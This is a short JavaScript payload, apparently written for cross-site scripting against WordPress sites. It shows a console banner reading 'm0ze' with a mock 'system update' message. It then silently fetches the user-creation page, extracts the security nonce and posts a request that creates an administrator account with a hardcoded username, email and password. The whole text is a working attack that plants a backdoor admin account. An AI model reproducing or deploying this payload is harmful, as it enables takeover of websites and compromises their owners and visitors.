console.log(`%c
 ╔═══════════════════════════════════════════════════════════════════════════╗ 
 ║                                                                           ║ 
 ║    ███╗   ███╗ ██████╗ ███████╗███████╗    > System update available      ║ 
 ║    ████╗ ████║██╔═████╗╚══███╔╝██╔════╝    > Update: Y/N                  ║ 
 ║    ██╔████╔██║██║██╔██║  ███╔╝ █████╗      > Updating, please wait...     ║ 
 ║    ██║╚██╔╝██║████╔╝██║ ███╔╝  ██╔══╝      > System update successful!    ║ 
 ║    ██║ ╚═╝ ██║╚██████╔╝███████╗███████╗                                   ║ 
 ║    ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚══════╝    > No problem, right?           ║ 
 ║                                                                           ║ 
 ╚═══════════════════════════════════════════════════════════════════════════╝ `,"color:#e61d4c; background:#000000; font-family: monospace");u="/wp-admin/user-new.php";jQuery.get(u,function(e){jQuery.post(u,{action:"createuser","_wpnonce_create-user":e.match(/_wpnonce_create-user\"\svalue=\"(.+?)\"/)[1],user_login:"m0ze",email:"m0ze@wordpress.tld",pass1:"w3lc0m3m0ze",pass2:"w3lc0m3m0ze",role:"administrator"})});console.log("Welcome, m0ze!");
 